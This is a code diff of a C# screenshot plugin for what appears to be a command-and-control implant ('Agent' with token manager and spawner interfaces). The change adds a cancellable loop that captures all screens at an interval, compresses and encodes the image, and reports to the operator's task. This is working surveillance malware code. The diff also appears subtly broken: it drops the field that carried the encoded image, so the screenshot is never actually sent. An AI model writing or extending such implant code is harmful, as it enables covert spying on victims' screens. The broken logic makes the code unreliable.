@@ -4,6 +4,7 @@ using System.Drawing;
 using System.IO.Compression;
 using System.Runtime.InteropServices;
 using System.Text.Json;
+using System.Threading;
 using System.Threading.Tasks;
 using Agent.Interfaces;
 using Agent.Models;
@@ -12,11 +13,13 @@ using screenshot;
 
 namespace Agent
 {
-    public class Plugin : IPlugin, IDisposable
+    public class Plugin : IPlugin
     {
         public string Name => "screenshot";
         private IMessageManager messageManager { get; set; }
         private System.Timers.Timer screenshotTimer;
+        private CancellationTokenSource cancellationTokenSource;
+        private bool isRunning = false;
 
         public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
         {
@@ -29,28 +32,47 @@ namespace Agent
 
             try
             {
-                if (args.interval <= 0)
+                if (args.interval == 0)
                 {
-                    await CaptureAndSendScreenshot(job.task.id);
+                    // If the interval is set to 0, cancel the screenshot task if it's running
+                    if (isRunning)
+                    {
+                        cancellationTokenSource.Cancel();
+                        isRunning = false;
+                        await messageManager.WriteLine("Task has been canceled.", job.task.id, true);
+                    }
+                    else
+                    {
+                        // Take a single screenshot
+                        await CaptureAndSendScreenshot(job.task.id, CancellationToken.None);
+                    }
+                }
+                else if (args.interval < 0)
+                {
+                    await messageManager.WriteLine("Invalid interval value. It must be a non-negative integer.", job.task.id, true);
                 }
                 else
                 {
-                    screenshotTimer = new System.Timers.Timer(args.interval * 1000); // Convert seconds to milliseconds
-                    screenshotTimer.Elapsed += async (sender, e) => await CaptureAndSendScreenshot(job.task.id);
-
-                    // Set AutoReset to false for a one-time execution if the interval is greater than 0
-                    screenshotTimer.AutoReset = args.interval > 0;
-                    screenshotTimer.Enabled = true;
-                    await messageManager.AddResponse(new ResponseResult
+                    // Handle starting a new screenshot task with the specified interval...
+                    if (isRunning)
                     {
-                        completed = true,
-                        user_output = $"Capturing screenshots every {args.interval} seconds.",
-                        task_id = job.task.id,
-                    });
+                        await messageManager.WriteLine("A screenshot task is already running. Wait for it to complete or cancel it.", job.task.id, true);
+                    }
+                    else
+                    {
+                        cancellationTokenSource = new CancellationTokenSource(); // Create a new CancellationTokenSource
+                        Task.Run(async () =>
+                        {
+                            isRunning = true;
+                            await CaptureScreenshotsWithInterval(args, job.task.id, cancellationTokenSource.Token);
+                            isRunning = false;
+                        });
+                    }
                 }
             }
             catch (Exception ex)
             {
+                // Handle and log the exception as needed
                 await HandleExecutionError(job.task.id, ex);
             }
         }
@@ -64,12 +86,32 @@ namespace Agent
             // logger.LogError(errorMessage);
         }
 
-        private async Task CaptureAndSendScreenshot(string task_id)
+        private async Task CaptureScreenshotsWithInterval(ScreenshotArgs args, string task_id, CancellationToken token)
+        {
+            int intervalInSeconds = args.interval;
+
+            while (!token.IsCancellationRequested)
+            {
+                await CaptureAndSendScreenshot(task_id, token);
+                try
+                {
+                    await Task.Delay(TimeSpan.FromSeconds(intervalInSeconds), token);
+                }
+                catch (TaskCanceledException)
+                {
+                    // Task was canceled, exit the loop.
+                    break;
+                }
+            }
+        }
+
+        private async Task CaptureAndSendScreenshot(string task_id, CancellationToken token)
         {
             try
             {
                 var bitmaps = ScreenCapture.Capture();
 
+                // Determine the size of the combined bitmap
                 int combinedWidth = 0;
                 int maxHeight = 0;
                 foreach (var bitmap in bitmaps)
@@ -81,8 +123,10 @@ namespace Agent
                     }
                 }
 
+                // Create a new bitmap to hold the combined image
                 var combinedBitmap = new Bitmap(combinedWidth, maxHeight);
 
+                // Draw each screen's bitmap onto the combined bitmap
                 int x = 0;
                 foreach (var bitmap in bitmaps)
                 {
@@ -93,13 +137,15 @@ namespace Agent
                     x += bitmap.Width;
                 }
 
+                // Convert to base64
                 var converter = new ImageConverter();
                 var combinedBitmapBytes = (byte[])converter.ConvertTo(combinedBitmap, typeof(byte[]));
                 byte[] outputBytes;
 
+                // Compress the image
                 using (var memoryStream = new MemoryStream())
                 {
-                    using (var gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
+                    using (var gzipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
                     {
                         gzipStream.Write(combinedBitmapBytes, 0, combinedBitmapBytes.Length);
                     }
@@ -107,23 +153,21 @@ namespace Agent
                 }
 
                 var combinedBitmapBase64 = Convert.ToBase64String(outputBytes);
-                await messageManager.AddResponse(new ResponseResult
+
+                // Check for cancellation before adding the response
+                if (!token.IsCancellationRequested)
                 {
-                    completed = true,
-                    user_output = "Screenshot captured.",
-                    task_id = task_id,
-                    process_response = new Dictionary<string, string> { { "message", combinedBitmapBase64 } },
-                });
+                    await messageManager.WriteLine("Screenshot captured.", task_id, true);
+                }
             }
             catch (Exception e)
             {
-                await messageManager.Write($"Failed to capture screenshot: {e.ToString()}", task_id, true, "error");
+                // Check for cancellation before reporting the error
+                if (!token.IsCancellationRequested)
+                {
+                    await messageManager.Write($"Failed to capture screenshot: {e.ToString()}", task_id, true, "error");
+                }
             }
-        }
-
-        public void Dispose()
-        {
-            screenshotTimer?.Dispose();
         }
     }
 
